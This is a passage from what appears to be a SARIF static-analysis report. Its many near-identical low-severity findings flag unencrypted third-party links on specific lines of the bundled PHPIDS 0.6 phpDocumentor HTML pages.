        "text" : "The file _Caching---Memcached.php.html on line 102 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "5D2D8326A7105BF8EB61125286DB20FB"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Memcached.php.html"
          },
          "region" : {
            "startLine" : 102,
            "endLine" : 102,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---Memcached.php.html:102"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Memcached.php.html"
                },
                "region" : {
                  "startLine" : 102
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---Memcached.php.html:102"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Memcached.php.html"
                },
                "region" : {
                  "startLine" : 102
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4609",
      "message" : {
        "text" : "The file _Caching---Session.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "9A0CF12233A5B440DCC7ADA201669E8F"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Session.php.html"
          },
          "region" : {
            "startLine" : 30,
            "endLine" : 30,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---Session.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Session.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---Session.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Session.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4610",
      "message" : {
        "text" : "The file _Caching---Session.php.html on line 31 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "9A0CF12233A5B440DCC7ADA201669E90"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Session.php.html"
          },
          "region" : {
            "startLine" : 31,
            "endLine" : 31,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---Session.php.html:31"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Session.php.html"
                },
                "region" : {
                  "startLine" : 31
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---Session.php.html:31"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Session.php.html"
                },
                "region" : {
                  "startLine" : 31
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4611",
      "message" : {
        "text" : "The file _Caching---Session.php.html on line 90 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "9A0CF12233A5B440DCC7ADA201669E91"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Session.php.html"
          },
          "region" : {
            "startLine" : 90,
            "endLine" : 90,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---Session.php.html:90"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Session.php.html"
                },
                "region" : {
                  "startLine" : 90
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---Session.php.html:90"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Session.php.html"
                },
                "region" : {
                  "startLine" : 90
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4612",
      "message" : {
        "text" : "The file _Caching---Session.php.html on line 91 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "9A0CF12233A5B440DCC7ADA201669E92"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Session.php.html"
          },
          "region" : {
            "startLine" : 91,
            "endLine" : 91,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---Session.php.html:91"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Session.php.html"
                },
                "region" : {
                  "startLine" : 91
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---Session.php.html:91"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Session.php.html"
                },
                "region" : {
                  "startLine" : 91
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4613",
      "message" : {
        "text" : "The file _Caching---Session.php.html on line 102 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "9A0CF12233A5B440DCC7ADA201669E93"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Session.php.html"
          },
          "region" : {
            "startLine" : 102,
            "endLine" : 102,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---Session.php.html:102"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Session.php.html"
                },
                "region" : {
                  "startLine" : 102
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---Session.php.html:102"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Session.php.html"
                },
                "region" : {
                  "startLine" : 102
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4460",
      "message" : {
        "text" : "The file _Converter.php.html on line 29 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "40BCC4C23C1DBDE2057F0A5927F3B378"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Converter.php.html"
          },
          "region" : {
            "startLine" : 29,
            "endLine" : 29,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Converter.php.html:29"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Converter.php.html"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Converter.php.html:29"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Converter.php.html"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4461",
      "message" : {
        "text" : "The file _Converter.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "40BCC4C23C1DBDE2057F0A5927F3B379"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Converter.php.html"
          },
          "region" : {
            "startLine" : 30,
            "endLine" : 30,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Converter.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Converter.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Converter.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Converter.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4462",
      "message" : {
        "text" : "The file _Converter.php.html on line 66 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "40BCC4C23C1DBDE2057F0A5927F3B37A"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Converter.php.html"
          },
          "region" : {
            "startLine" : 66,
            "endLine" : 66,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Converter.php.html:66"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Converter.php.html"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Converter.php.html:66"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Converter.php.html"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4399",
      "message" : {
        "text" : "The file _Event.php.html on line 29 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "18FBE4CC6AD19A5632CCE7131B37B927"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Event.php.html"
          },
          "region" : {
            "startLine" : 29,
            "endLine" : 29,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Event.php.html:29"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Event.php.html"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Event.php.html:29"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Event.php.html"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4400",
      "message" : {
        "text" : "The file _Event.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "18FBE4CC6AD19A5632CCE7131B37B928"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Event.php.html"
          },
          "region" : {
            "startLine" : 30,
            "endLine" : 30,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Event.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Event.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Event.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Event.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4401",
      "message" : {
        "text" : "The file _Event.php.html on line 66 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "18FBE4CC6AD19A5632CCE7131B37B929"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Event.php.html"
          },
          "region" : {
            "startLine" : 66,
            "endLine" : 66,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Event.php.html:66"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Event.php.html"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Event.php.html:66"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Event.php.html"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4674",
      "message" : {
        "text" : "The file _Filter---Filter.php.html on line 60 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "C7BE5FADA79D6F1351CD48AF813A83AA"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter---Filter.php.html"
          },
          "region" : {
            "startLine" : 60,
            "endLine" : 60,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Filter---Filter.php.html:60"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter---Filter.php.html"
                },
                "region" : {
                  "startLine" : 60
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Filter---Filter.php.html:60"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter---Filter.php.html"
                },
                "region" : {
                  "startLine" : 60
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4599",
      "message" : {
        "text" : "The file _Filter---Storage---Abstract.php.html on line 60 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "94EE0E096812910A1403E938CBB3155D"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter---Storage---Abstract.php.html"
          },
          "region" : {
            "startLine" : 60,
            "endLine" : 60,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Filter---Storage---Abstract.php.html:60"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter---Storage---Abstract.php.html"
                },
                "region" : {
                  "startLine" : 60
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Filter---Storage---Abstract.php.html:60"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter---Storage---Abstract.php.html"
                },
                "region" : {
                  "startLine" : 60
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4595",
      "message" : {
        "text" : "The file _Filter---Storage.php.html on line 29 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "93D3157BB9AE1B5A098EFCD7EFD3D315"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter---Storage.php.html"
          },
          "region" : {
            "startLine" : 29,
            "endLine" : 29,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Filter---Storage.php.html:29"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter---Storage.php.html"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Filter---Storage.php.html:29"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter---Storage.php.html"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4596",
      "message" : {
        "text" : "The file _Filter---Storage.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "93D3157BB9AE1B5A098EFCD7EFD3D316"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter---Storage.php.html"
          },
          "region" : {
            "startLine" : 30,
            "endLine" : 30,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Filter---Storage.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter---Storage.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Filter---Storage.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter---Storage.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4597",
      "message" : {
        "text" : "The file _Filter---Storage.php.html on line 66 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "93D3157BB9AE1B5A098EFCD7EFD3D317"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter---Storage.php.html"
          },
          "region" : {
            "startLine" : 66,
            "endLine" : 66,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Filter---Storage.php.html:66"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter---Storage.php.html"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Filter---Storage.php.html:66"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter---Storage.php.html"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4746",
      "message" : {
        "text" : "The file _Filter.php.html on line 29 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F604C58EE6F3ACCB8DFC2A6D51ACE02D"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter.php.html"
          },
          "region" : {
            "startLine" : 29,
            "endLine" : 29,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Filter.php.html:29"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter.php.html"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Filter.php.html:29"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter.php.html"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4747",
      "message" : {
        "text" : "The file _Filter.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F604C58EE6F3ACCB8DFC2A6D51ACE02E"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter.php.html"
          },
          "region" : {
            "startLine" : 30,
            "endLine" : 30,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Filter.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Filter.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4748",
      "message" : {
        "text" : "The file _Filter.php.html on line 66 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F604C58EE6F3ACCB8DFC2A6D51ACE02F"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter.php.html"
          },
          "region" : {
            "startLine" : 66,
            "endLine" : 66,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Filter.php.html:66"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter.php.html"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Filter.php.html:66"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Filter.php.html"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4616",
      "message" : {
        "text" : "The file _Init.php.html on line 29 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "9DA53B44ACB05365925216882B36B21A"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Init.php.html"
          },
          "region" : {
            "startLine" : 29,
            "endLine" : 29,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Init.php.html:29"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Init.php.html"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Init.php.html:29"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Init.php.html"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4617",
      "message" : {
        "text" : "The file _Init.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "9DA53B44ACB05365925216882B36B21B"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Init.php.html"
          },
          "region" : {
            "startLine" : 30,
            "endLine" : 30,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Init.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Init.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Init.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Init.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4618",
      "message" : {
        "text" : "The file _Init.php.html on line 66 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "9DA53B44ACB05365925216882B36B21C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Init.php.html"
          },
          "region" : {
            "startLine" : 66,
            "endLine" : 66,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Init.php.html:66"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Init.php.html"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Init.php.html:66"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Init.php.html"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4409",
      "message" : {
        "text" : "The file _Log---Composite.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "1E3DCDFDA9CE641A84F0CAD5F87D6B84"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Composite.php.html"
          },
          "region" : {
            "startLine" : 30,
            "endLine" : 30,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---Composite.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Composite.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---Composite.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Composite.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4410",
      "message" : {
        "text" : "The file _Log---Composite.php.html on line 31 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "1E3DCDFDA9CE641A84F0CAD5F87D6B85"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
